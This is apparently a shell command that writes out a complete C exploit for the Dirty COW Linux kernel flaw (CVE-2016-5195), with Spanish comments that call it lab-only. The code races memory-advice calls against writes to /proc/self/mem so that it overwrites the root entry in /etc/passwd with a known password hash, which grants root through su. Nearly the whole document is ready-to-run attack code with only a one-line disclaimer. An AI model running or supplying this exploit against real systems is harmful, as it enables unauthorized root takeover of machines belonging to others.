cat > exploit/dirtycow_passwd.c <<'EOF'
/*
 Dirty COW (CVE-2016-5195) – Variante sencilla en C para /etc/passwd
 SOLO PARA LABORATORIO EDUCATIVO.
 Inserta/reescribe la línea de root con hash SHA-512 de "dirtyCowFun".
 Luego podrás hacer: su root  (password: dirtyCowFun)
*/
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

static const char *target = "/etc/passwd";
static const char *payload =
"root:$6$P7xBAooQEZX/ham$9L7U0KJoihNgQakyfOQokDgQWLSTFZGB9LUU7T0W2kH1rtJXTzt9mG4qOoz9Njt.tIklLtLosiaeCBsZm8hND/:0:0:root:/root:/bin/bash\n";

static void *map;
static struct stat st;

static void *madviseThread(void *arg){
    for (int i = 0; i < 1000000; i++)
        madvise(map, st.st_size, MADV_DONTNEED);
    return NULL;
}

static void *writeThread(void *arg){
    int f = open("/proc/self/mem", O_RDWR);
    if (f < 0) { perror("open mem"); return NULL; }
    for (int i = 0; i < 1000000; i++){
        lseek(f, (off_t)map, SEEK_SET);
        write(f, payload, strlen(payload));
    }
    close(f);
    return NULL;
}

int main(void){
    int f = open(target, O_RDONLY);
    if (f < 0){ perror("open target"); return 1; }
    if (fstat(f, &st) < 0){ perror("fstat"); return 1; }

    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    if (map == MAP_FAILED){ perror("mmap"); return 1; }
    close(f);

    pthread_t t1, t2;
    if (pthread_create(&t1, NULL, madviseThread, NULL) != 0){ perror("pthread_create t1"); return 1; }
    if (pthread_create(&t2, NULL, writeThread,   NULL) != 0){ perror("pthread_create t2"); return 1; }
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    write(2, "done\n", 5);
    return 0;
}
EOF
